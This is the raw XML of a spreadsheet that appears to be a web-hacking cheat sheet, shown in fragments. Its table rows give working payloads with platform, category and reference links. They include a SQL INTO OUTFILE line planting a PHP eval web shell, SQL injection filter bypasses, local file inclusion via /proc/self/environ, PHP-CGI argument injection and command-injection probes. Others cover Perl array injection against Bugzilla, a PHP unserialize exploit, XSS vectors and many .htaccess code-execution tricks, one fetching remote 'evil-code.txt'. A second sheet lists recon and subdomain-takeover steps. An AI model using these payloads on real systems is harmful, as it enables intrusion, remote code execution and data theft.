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414.74pt"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="168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122.26pt"/>
    </style:style>
    <style:style style:name="co6" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="158.26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14.75pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro4" style:family="table-row">
      <style:table-row-properties style:row-height="89.26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331.51pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro7" style:family="table-row">
      <style:table-row-properties style:row-height="204.01pt" fo:break-before="auto" style:use-optimal-row-height="tru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28.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="99.75pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11" style:family="table-row">
      <style:table-row-properties style:row-height="85.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro12" style:family="table-row">
      <style:table-row-properties style:row-height="114.01pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro13" style:family="table-row">
      <style:table-row-properties style:row-height="199.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro14" style:family="table-row">
      <style:table-row-properties style:row-height="57pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro1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563c1" style:text-position="" fo:font-size="10pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color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  <style:text-properties style:text-position=""/>
    </style:style>
    <style:style style:name="ce12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563c1" style:text-position="" fo:font-size="10pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="ce13" style:family="table-cell" style:parent-style-name="Hyperlink" style:data-style-name="N0">
      <style:text-properties fo:color="#0563c1" style:text-position="" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="ce2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3" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
      <style:text-properties fo:color="#0000ff" style:text-position=""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top"/>
      <style:text-properties style:text-position="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  <style:text-properties style:text-position=""/>
    </style:style>
    <style:style style:name="ce7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style:text-position=""/>
    </style:style>
    <style:style style:name="ce9" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
      <style:text-properties style:text-position="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20" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
      <style:text-properties fo:color="#0000ff" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="ce2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2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24" style:family="table-cell" style:parent-style-name="Default" style:data-style-name="N0">
      <style:table-cell-properties fo:wrap-option="wrap" style:vertical-align="automatic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ce26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563c1" fo:font-size="10pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color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29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563c1" fo:font-size="10pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="ce30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C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ulns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o outfile '/var/www/.a.php' lines terminated by '&lt;?php eval($_POST[cmd]);?&gt;'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hell Upload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/**/union/**/select/**/1,2,3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%09union%0Dselect%A01,2,3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-1)union(select(1),2,3)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LECT 0x666f6f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ingle quote, string to hex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$db_user = "root ${@phpinfo()}"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Double Quote Evaluta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a xlink:href="mailto:$%7B@eval" xlink:type="simple">$db_user= "root ${@eval($_POST[cmd])}";</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>Double Quote Evaluta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../../../etc/passwd%0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FI Detec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ocal File Inclusion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odule=../../../../proc/self/environ</text:p>
            <text:p>User-Agent: &lt;?php file_put_contents('.a.php',$_POST[c]); ?&gt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FI via UserAgent and /proc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ocal File Inclus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ex.php?-s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HP CGI Agrumen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PHP-CGI Argument Injection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index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input</text:p>
            <text:p>POST Data: &lt;?php phpinfo(); ?&gt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HP CGI Agrumen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PHP-CGI Argument Injection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@list = ( 'Ba', 'Ba', 'Banana');</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p>'B' =&gt; 'Banana',</text:p>
            <text:p>'C' =&gt; @list };</text:p>
            <text:p>print Dumper($hash); # correct!</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p>'B' =&gt; 'Banana',</text:p>
            <text:p>'C' =&gt; 'Ba',</text:p>
            <text:p>'Ba' =&gt; 'Banana' };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POC of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1019"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell/>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>my $otheruser = Bugzilla::User-&gt;create(</text:p>
            <text:p>{</text:p>
            <text:p>login_name =&gt; $login_name,</text:p>
            <text:p>realname =&gt; $cgi-&gt;param('realname'),</text:p>
            <text:p>cryptpassword =&gt; $password</text:p>
            <text:p>});</text:p>
            <text:p># index.cgi?realname=xxx&amp;realname=login_name&amp;realname=admi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Demo exploit of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit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/backup/20150707_002dfa0f3ac08429.zip</text:p>
            <text:p>/backup/201507~1.zip</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Windows Til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ell.php # shel&gt;.php # shell"php # shell.&lt;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ndows API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cal File Inclus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wnload.php::$data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ndows NFT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cal File Inclusion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://blog.csdn.net/yiyefangzhou24/article/details/17190135" xlink:type="simple">http://blog.csdn.net/yiyefangzhou24/article/details/17190135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O OUTFILE 'plugins::$index_allocation'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Create Folder with MySQL 5.1 on Windows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|sleep 7|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CE tes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;sleep 7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CE tes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$(sleep 7)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CE tes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?arg[0]=uid.jpg%0A</text:p>
            <text:p>&amp;arg[1]=sleep</text:p>
            <text:p>&amp;arg[2]=7%0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CE tes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lumn Trunca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CHARSET=utf8</text:p>
            <text:p>A → Ã</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MySQL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql" xlink:type="simple">https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql</text:a>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 table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://websec.github.io/unicode-security-guide/character-transformations/" xlink:type="simple">http://websec.github.io/unicode-security-guide/character-transformations/</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell/>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>uid=0x31206f7220313d31</text:p>
            <text:p># 1 or 1=1</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP is_numeric()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style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>$uid = $_GET['uid'];</text:p>
            <text:p>if ( is_numeric($uid) )</text:p>
            <text:p>query("INSERT INTO blacklist VALUES($uid)");</text:p>
            <text:p>$uids = query("SELECT uid FROM blacklist");</text:p>
            <text:p>foreach ($uids as $uid) {</text:p>
            <text:p>show( query("SELECT log FROM logs WHERE uid=$uid") );</text:p>
            <text:p>}</text:p>
            <text:p>//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<text:a xlink:href="http://hackme.cc:8080/sub/.%252e/" xlink:type="simple">.%252e http://hackme.cc:8080/sub/.%252e/jmx-console/</text:a>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mod_jk, access tomcat, jmx console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Double Encoding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<text:a xlink:href="http://hackme.cc/admin%252f" xlink:type="simple">http://hackme.cc/admin%252f%252ehtaccess%2500.cfm</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ColdFusion</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Double Encod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Bit of Pyth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Multi</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://access.redhat.com/blogs/766093/posts/2592591" xlink:type="simple">https://access.redhat.com/blogs/766093/posts/2592591</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell/>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;?php</text:p>
            <text:p>class obj implements Serializable {</text:p>
            <text:p>var $data;</text:p>
            <text:p>function serialize() {</text:p>
            <text:p>return serialize($this-&gt;data);</text:p>
            <text:p>}</text:p>
            <text:p>function unserialize($data) {</text:p>
            <text:p>$this-&gt;data = unserialize($data);</text:p>
            <text:p>}</text:p>
            <text:p>}</text:p>
            <text:p>$inner = 'a:1:{i:0;O:9:"Exception":2:{s:7:"'."\0".'*'."\0".'file";R:4;}';</text:p>
            <text:p>$exploit = 'a:2:{i:0;C:3:"obj":'.strlen($inner).':{'.$inner.'}i:1;R:4;}';</text:p>
            <text:p>$data = unserialize($exploit);</text:p>
            <text:p>echo $data[1];</text:p>
            <text:p>?&gt;</text:p>
            <text:p>s:12:"%00HITCON%00conn";O:9:"Exception":2:{s:7:"*file";R:4;}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p>unserialize bypass wake up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Unserizalize</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://www.google.fr/#q=bypass+__wakeup" xlink:type="simple">https://www.google.fr/#q=bypass+__wakeup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%00HITCON%00metho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rivate method, attribute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Unserizalize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 table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Wrapper : zip:///path/to/filename#dir/file <text:s/>Example:page=zip://avators/bi0sca70c2c8ad1dc9376848131c3b90d99f2d3833ee.jpg%23shell</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Local File Inclusion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="4" table:number-rows-spanned="3">
            <text:p><text:a xlink:href="https://blog.0daylabs.com/2015/09/07/mmactf-web300-challenge-writeup/" xlink:type="simple">https://blog.0daylabs.com/2015/09/07/mmactf-web300-challenge-writeup/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LFI - RCE</text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="4"/>
          <table:table-cell table:number-columns-repeated="1014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rc=javascript:alert(1)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==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&lt;form action=javascript:alert(1)&gt;</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>X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lt;isindex action=javascript:alert(1) type=submit value=click&gt; *</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://brutelogic.com.br/blog/xss-without-event-handlers/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost" xlink:type="simple">http://brutelogic.com.br/blog/xss-without-event-handlers/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost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&lt;object data=javascript:alert(1)&gt; *</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>X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lt;iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;&gt;</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS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php_value auto_append_file /etc/hosts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.htaccess injection - file inclus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9">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>php_value auto_append_file .htaccess</text:p>
            <text:p>#&lt;?php phpinfo();</text:p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PHP code execu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0">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php: (empty)</text:p>
            <text:p>.htacess:</text:p>
            <text:p>php_flag allow_url_include 1</text:p>
            <text:p>php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</text:p>
            <text:p>#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</text:p>
            <text:p>#php_value auto_append_file https://sektioneins.de/evil-code.txt</text:p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(direct/remote) file inclus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0">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php: (produces error message)</text:p>
            <text:p>&lt;?php</text:p>
            <text:p>include('foo');</text:p>
            <text:p>.htacess:</text:p>
            <text:p>php_flag display_errors 1</text:p>
            <text:p>php_flag html_errors 1</text:p>
            <text:p>php_value docref_root "'&gt;&lt;script&gt;alert(1);&lt;/script&gt;"</text:p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XSS via error message link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1">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php: (empty)</text:p>
            <text:p>.htacess:</text:p>
            <text:p>php_flag zend.multibyte 1</text:p>
            <text:p>php_value zend.script_encoding "UTF-7"</text:p>
            <text:p>php_value auto_append_file .htaccess</text:p>
            <text:p>#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+Ads</text:p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XSS and PHP code execution with UTF-7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2">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php"</text:p>
            <text:p>&lt;?php</text:p>
            <text:p>include('foo');</text:p>
            <text:p>.htaccess:</text:p>
            <text:p>php_flag display_errors 1</text:p>
            <text:p>php_flag html_errors 1</text:p>
            <text:p>php_value docref_root "x"</text:p>
            <text:p>php_value docref_ext "&lt;script&gt;alert(1);&lt;/script&gt;"</text:p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XSS via error message link extens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3">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>.htacess:</text:p>
            <text:p>php_value highlight.comment '"&gt;&lt;script&gt;alert(1);&lt;/script&gt;'</text:p>
            <text:p>phps enables:</text:p>
            <text:p>&lt;FilesMatch ".+\.phps$"&gt;</text:p>
            <text:p>    SetHandler application/x-httpd-php-source</text:p>
            <text:p>    Order Allow,Deny</text:p>
            <text:p>    Allow from all</text:p>
            <text:p>&lt;/FilesMatch&gt;</text:p>
            <text:p>index.phps:</text:p>
            <text:p>&lt;?php</text:p>
            <text:p>test();</text:p>
            <text:p>// comment</text:p>
            <text:p>?&gt;</text:p>
            <text:p>text</text:p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XSS via phps color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0">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php:</text:p>
            <text:p>&lt;?php</text:p>
            <text:p>highlight_file(__FILE__);</text:p>
            <text:p>// comment</text:p>
            <text:p>.htacess:</text:p>
            <text:p>php_value highlight.comment '"&gt;&lt;script&gt;alert(1);&lt;/script&gt;'</text:p>
            <text:p/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XSS via highlight_file() color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1">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php:</text:p>
            <text:p>&lt;?php include('foo');</text:p>
            <text:p>.htaccess:</text:p>
            <text:p>php_value error_log /var/www/ex4a/foo.php</text:p>
            <text:p>php_value include_path "&lt;?php phpinfo(); __halt_compiler();"</text:p>
            <text:p/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failed PHP injection via error_log and include_path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4">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php: (empty)</text:p>
            <text:p>.htaccess:</text:p>
            <text:p>php_value error_log /var/www/ipc/ex4b/foo.php</text:p>
            <text:p>php_value auto_prepend_file "&lt;?php phpinfo(); __halt_compiler();"</text:p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failed PHP injection via error_log and auto_prepend_file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2">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php: (empty)</text:p>
            <text:p>.htaccess:</text:p>
            <text:p>php_value error_log /var/www/ipc/ex4c/foo.php</text:p>
            <text:p>#---- "&lt;?php phpinfo(); __halt_compiler();" in UTF-7:</text:p>
            <text:p>php_value include_path "+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs"</text:p>
            <text:p>php_flag zend.multibyte 1</text:p>
            <text:p>php_value zend.script_encoding "UTF-7"</text:p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PHP code injection via error_log and UTF-7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4">
          <table:table-cell/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>index.php:</text:p>
            <text:p>&lt;?php some_code();</text:p>
            <text:p>.htaccess:</text:p>
            <text:p>php_flag engine 0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string">
            <text:p>.htaccess injection - Source code disclosure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FI</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" xlink:type="simple">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro15" table:number-rows-repeated="104852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heck_list" table:style-name="ta2">
        <table:table-column table:style-name="co1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1" table:number-columns-repeated="1019" table:default-cell-style-name="ce18"/>
        <table:table-column table:style-name="co4" table:default-cell-style-name="ce18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map scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>nmap -A -p 1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ectory brute forc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sl check</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce19" office:value-type="string" calcext:value-type="string">
            <text:p>Get SSL certificate info</text:p>
            <text:p>Request with right host header</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>If access via I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 version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Framewor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ird part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b domain brute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Domain check</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check point to Cloudfront. S3 bucket AWS3, Heroku</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Take owner</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1020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fo:font-size="10pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian="10pt" style:font-size-complex="10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print="charts drawings objects"/>
      <style:header-style>
        <style:header-footer-properties fo:min-height="24.21pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-bottom="0pt"/>
      </style:header-style>
      <style:footer-style>
        <style:header-footer-properties fo:min-height="24.21pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-top="0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print="charts drawings objects"/>
      <style:header-style>
        <style:header-footer-properties fo:min-height="24.21pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-bottom="0pt"/>
      </style:header-style>
      <style:footer-style>
        <style:header-footer-properties fo:min-height="24.21pt" fo:margin-left="0pt" fo:margin-right="0pt" fo:margin-top="0pt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7:02:13.840297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0-11T11:01:48Z</meta:creation-date>
    <dc:date>2017-01-03T17:02:25.988259849</dc:date>
    <meta:editing-cycles>25</meta:editing-cycles>
    <meta:editing-duration>PT1H18M4S</meta:editing-duration>
    <meta:document-statistic meta:table-count="2" meta:cell-count="25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